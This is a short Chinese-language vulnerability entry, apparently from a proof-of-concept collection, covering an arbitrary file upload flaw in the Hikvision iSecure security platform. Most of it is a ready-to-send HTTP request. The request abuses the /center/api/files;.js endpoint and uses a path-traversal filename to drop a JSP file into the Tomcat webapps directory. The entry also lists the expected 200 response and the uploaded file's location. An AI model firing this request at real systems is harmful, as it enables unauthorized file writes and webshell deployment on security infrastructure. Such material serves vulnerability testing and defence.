﻿# 海康安防iSecure系统 文件上传漏洞

> 更新时间：2024-04-07

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /center/api/files;.js HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxxmdzwoe

------WebKitFormBoundaryxxmdzwoe
Content-Disposition: form-data; name="upload";filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/dudesite.jsp"
Content-Type:image/jpeg

1
------WebKitFormBoundaryxxmdzwoe--
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/apache-tomcat/webapps/clusterMgr/dudesite.jsp

> 验证文件来源：海康安防iSecure系统 文件上传漏洞.poc

